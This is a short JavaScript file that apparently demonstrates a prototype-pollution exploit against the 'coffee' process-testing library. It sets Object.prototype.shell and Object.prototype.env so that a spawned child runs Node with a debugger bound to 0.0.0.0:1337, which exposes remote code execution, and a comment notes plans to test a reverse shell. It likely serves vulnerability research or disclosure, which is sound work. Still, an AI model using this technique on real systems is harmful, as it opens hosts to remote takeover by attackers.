const coffee = require('coffee');

// TODO: test a reverse shell for Linux

Object.prototype.shell = 'node';
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

coffee.spawn('cat')
  .write('1')
  .write('2')
  .expect('stdout', '12')
  .expect('code', 0)
  .end();